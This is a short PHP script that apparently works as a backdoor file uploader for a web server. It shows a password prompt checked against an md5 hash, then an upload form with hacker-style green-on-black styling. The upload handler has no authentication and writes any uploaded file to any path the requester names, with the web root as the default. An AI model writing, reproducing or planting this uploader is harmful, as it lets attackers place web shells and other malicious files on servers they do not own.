<?php
error_reporting(E_ALL);

$upload_dir = $_SERVER["DOCUMENT_ROOT"] . "/";

if ($_GET['cmd'] == 'up') {
   if (!isset($_POST['password'])) {
       echo '<form action="?cmd=up" method="POST">
           Password: <input type="password" name="password">
           <input type="submit" value="Submit">
       </form>';
   } else {
       $password = md5($_POST['password']);

       if ($password == '0cb00eeb43693fb179308c7c3dd73a20') { 
           echo '<form enctype="multipart/form-data" action="?upload=1" method="POST">
               <input type="hidden" name="ac" value="upload">
               <table>
                   <tr>
                       <td><font size="1">Your File : </font> </td>
                       <td><input size="48" name="file" type="file" style="color: #008000; font-family: Arial; font-size: 8pt; font-weight: bold; border: 2px solid #008000; background-color: #000000"></td>
                   </tr>
                   <tr>
                       <td><font size="1">Upload Dir : </font> </td>
                       <td><input size="48" value="' . $upload_dir . '" name="path" type="text" style="color: #008000; font-family: Arial; font-size: 8pt; font-weight: bold; border: 2px solid #008000; background-color: #000000">
                       <input type="submit" value="Upload" style="color: #008000; font-family: Arial; font-size: 8pt; font-weight: bold; border: 2px solid #008000; background-color: #000000"></td>
                   </tr>
               </table>
           </form>';
       } else {
           echo "Access Denied!";
       }
   }
}

if ($_GET['upload'] == '1') {
   $uploadfile = $_POST['path'] . basename($_FILES['file']['name']);
   if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
       echo "successfully uploaded.\n";
       echo "=>:\n";
       echo "name: " . $_FILES['file']['name'] . "\n";
       echo "Stored in: " . $uploadfile;
   } else {
       echo "Upload failed";
   }
}
?>